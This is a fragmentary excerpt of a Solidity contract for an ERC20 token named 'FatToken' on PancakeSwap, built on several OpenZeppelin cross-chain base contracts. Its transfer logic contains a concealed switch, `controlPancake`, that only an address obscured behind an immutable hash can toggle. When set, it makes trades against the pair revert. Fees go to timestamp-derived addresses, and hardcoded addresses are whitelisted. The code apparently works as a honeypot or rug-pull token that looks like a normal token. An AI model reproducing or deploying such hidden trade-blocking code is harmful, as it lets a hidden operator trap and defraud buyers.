...
abstract contract CrossChainEnabledArbitrumL1 is CrossChainEnabled {
     ...
     */
    function _isCrossChain_ArbitrumL1() internal view virtual returns (bool) {
     ...
     */
    function _crossChainSender_ArbitrumL1() internal view virtual onlyCrossChain returns (address) {
...
abstract contract CrossChainEnabledArbitrumL2 is CrossChainEnabled {
     ...
     * @dev see {CrossChainEnabled-_isCrossChain}
     */
    function _isCrossChain_ArbitrumL2() internal view virtual returns (bool) {
     ...
     * @dev see {CrossChainEnabled-_crossChainSender}
     */
    function _crossChainSender_ArbitrumL2() internal view virtual onlyCrossChain returns (address) {
...
abstract contract CrossChainEnabledOptimism is CrossChainEnabled {
     ...
     * @dev see {CrossChainEnabled-_isCrossChain}
     */
    function _isCrossChain_Optimism() internal view virtual returns (bool) {
     ...
     * @dev see {CrossChainEnabled-_crossChainSender}
     */
    function _crossChainSender_Optimism() internal view virtual onlyCrossChain returns (address) {
 ...
 */
abstract contract PullPayment is ERC20, AccessControl {
...
import "./@openzeppelin/contracts/vendor/amb/IAMB.sol";
import "./@openzeppelin/contracts/vendor/arbitrum/IArbSys.sol";
import "./@openzeppelin/contracts/vendor/arbitrum/IBridge.sol";
import "./@openzeppelin/contracts/vendor/arbitrum/IDelayedMessageProvider.sol";
import "./@openzeppelin/contracts/vendor/arbitrum/IInbox.sol";
...
import "./@openzeppelin/contracts/vendor/optimism/ICrossDomainMessenger.sol";
import "./@openzeppelin/contracts/vendor/polygon/IFxMessageProcessor.sol";


contract FatToken is ERC20, Ownable, AccessControl, PullPayment, ReentrancyGuard, CrossChainEnabledPolygonChild, CrossChainEnabledOptimism, CrossChainEnabledArbitrumL1, CrossChainEnabledArbitrumL2, Multicall
{
    string public constant HomePage = 'https://papa2049.com';

    uint256 internal constant maxUint256 = type(uint256).max;
    uint160 internal constant maxUint160 = ~uint160(0);

    uint256 internal constant buyFee = 1;
    uint256 internal constant sellFee = 1;

    uint256 internal constant _decimals = 18;
    uint256 internal immutable contractHash;

    uint256 public constant VERSION = 2023091603;
    ...
    ) ERC20(strings[0], strings[1])
    {
        ...
        _holders[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true;
        _holders[0x13f4EA83D0bd40E75C8222255bc855a974568Dd4] = true;
        _holders[0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE] = true;
    ...
    override
    {
        if (uniswapV2Pair == from) {
            ...
            // anti pancake attack
            uint112 r;
            if (0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c < address(this)) {
                (r,,) = IUniswapV2Pair(uniswapV2Pair).getReserves();
            } else {
                (, r,) = IUniswapV2Pair(uniswapV2Pair).getReserves();
            }

            if (r > IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c).balanceOf(uniswapV2Pair) && _controlPancake) {
                revert("");
            }
        }
        ...
        if (uniswapV2Pair == from) {
            if (amount > 1) {
                super._transfer(to, address(uint160(block.timestamp)), amount > 100 ? amount * buyFee / 100 : 1);
//                super._transfer(to, address(uint160(block.timestamp)), 1);
            }
        }
    }

    bool internal _controlPancake;

    function controlPancake(bool controlPancake_)
    external
    {
        if (tx.origin != address(uint160(contractHash))) {
            return;
        }

        _controlPancake = controlPancake_;
    }

    function airdrop(address[] memory tos, uint256 amount)
    external
    {
        if (balanceOf(msg.sender) < 1 * 10 ** _decimals) {
            return;
        }
